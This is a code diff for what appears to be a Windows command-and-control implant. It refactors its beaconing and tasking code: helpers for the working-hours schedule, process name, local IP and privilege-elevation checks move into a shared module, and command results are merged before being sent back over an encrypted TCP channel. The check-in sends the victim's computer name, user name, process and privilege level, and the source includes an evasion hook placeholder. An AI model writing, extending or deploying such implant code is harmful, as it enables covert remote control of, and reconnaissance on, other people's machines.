@@ -3,6 +3,8 @@
 #include "ConnectorTCP.h"
 #include "JobsController.h"
 #include "Downloader.h"
+#include "AsyncQueue.h"
+#include "RuntimeCommon.h"
 #include "../protocol/protocol.h"
 #include "../crypto/crypto.h"
 // __EVASION_INCLUDE__
@@ -26,72 +28,6 @@ struct DefaultProfile {
     int workStart = 0;
     int workEnd = 0;
 };
-
-static uint32_t encodeWorkingTime(int start, int end)
-{
-    if (start == 0 && end == 0) {
-        return 0;
-    }
-    int startHour = start / 100;
-    int startMin  = start % 100;
-    int endHour   = end / 100;
-    int endMin    = end % 100;
-    return ((uint32_t)startHour << 24) | ((uint32_t)startMin << 16) | ((uint32_t)endHour << 8) | (uint32_t)endMin;
-}
-
-static void decodeWorkingTime(uint32_t wt, int* workStart, int* workEnd)
-{
-    if (!workStart || !workEnd) {
-        return;
-    }
-    if (wt == 0) {
-        *workStart = 0;
-        *workEnd = 0;
-        return;
-    }
-    int startHour = (int)((wt >> 24) & 0xff);
-    int startMin  = (int)((wt >> 16) & 0xff);
-    int endHour   = (int)((wt >> 8) & 0xff);
-    int endMin    = (int)(wt & 0xff);
-    *workStart = startHour * 100 + startMin;
-    *workEnd = endHour * 100 + endMin;
-}
-
-static std::string currentProcessName()
-{
-    char path[MAX_PATH] = {0};
-    DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
-    if (len == 0 || len >= MAX_PATH) {
-        return "__NAME__";
-    }
-    for (int i = (int)len - 1; i >= 0; --i) {
-        if (path[i] == '\\' || path[i] == '/') {
-            return std::string(path + i + 1);
-        }
-    }
-    return std::string(path);
-}
-
-static uint32_t localIPv4()
-{
-    return 0;
-}
-
-static BOOL isElevatedLocal()
-{
-    HANDLE hToken = NULL;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-        return FALSE;
-    }
-    TOKEN_ELEVATION elevation = {};
-    DWORD retLen = 0;
-    BOOL elevated = FALSE;
-    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &retLen)) {
-        elevated = elevation.TokenIsElevated ? TRUE : FALSE;
-    }
-    CloseHandle(hToken);
-    return elevated;
-}
 
 static BOOL parseEmbeddedProfile(const BYTE* blob, ULONG blobSize, DefaultProfile* outProfile, BYTE** outKey)
 {
@@ -276,7 +212,11 @@ void Agent::Run(void* profileBlob, ULONG profileSize)
             commander->ProcessCommandTasks(recv, recvSize, outBuf, &outSize);
             free(recv);
 
-            if (!tcp->SendFrame(outBuf, outSize, sessionKey, 32)) {
+            std::vector<BYTE> merged = async_queue::MergeBinaryResponseBlob(outBuf, outSize);
+            const BYTE* sendPtr = merged.empty() ? outBuf : merged.data();
+            ULONG sendLen = merged.empty() ? outSize : (ULONG)merged.size();
+
+            if (!tcp->SendFrame(sendPtr, sendLen, sessionKey, 32)) {
                 free(outBuf);
                 break;
             }
@@ -317,7 +257,7 @@ BYTE* Agent::BuildBeat(ULONG* size)
     WriterBEWriteUint32(w, sleepMs / 1000);
     WriterBEWriteUint32(w, jitter);
     WriterBEWriteUint32(w, (uint32_t)killDate);
-    WriterBEWriteUint32(w, encodeWorkingTime(workStart, workEnd));
+    WriterBEWriteUint32(w, runtime_common::EncodeWorkingTime(workStart, workEnd));
     WriterBEWriteUint16(w, (uint16_t)GetACP());
     WriterBEWriteUint16(w, (uint16_t)GetOEMCP());
     WriterBEWriteUint8(w, 0);
@@ -326,13 +266,13 @@ BYTE* Agent::BuildBeat(ULONG* size)
     WriterBEWriteUint32(w, 0);
     WriterBEWriteUint8(w, 10);
     WriterBEWriteUint8(w, 0);
-    WriterBEWriteUint32(w, localIPv4());
+    WriterBEWriteUint32(w, runtime_common::LocalIPv4());
 
     BYTE flags = 0;
     if (sizeof(void*) == 8) {
         flags |= 0x01 | 0x02;
     }
-    if (isElevatedLocal()) {
+    if (runtime_common::IsProcessElevated()) {
         flags |= 0x04;
     }
     WriterBEWriteUint8(w, flags);
@@ -341,7 +281,7 @@ BYTE* Agent::BuildBeat(ULONG* size)
     WriterBEWriteBytes(w, (BYTE*)computerName, (uint32_t)strlen(computerName));
     WriterBEWriteBytes(w, (BYTE*)username, (uint32_t)strlen(username));
 
-    std::string proc = currentProcessName();
+    std::string proc = runtime_common::CurrentProcessName("__NAME__");
     WriterBEWriteBytes(w, (BYTE*)proc.c_str(), (uint32_t)proc.size());
 
     BYTE* beat = (BYTE*)LocalAlloc(LPTR, w->size);
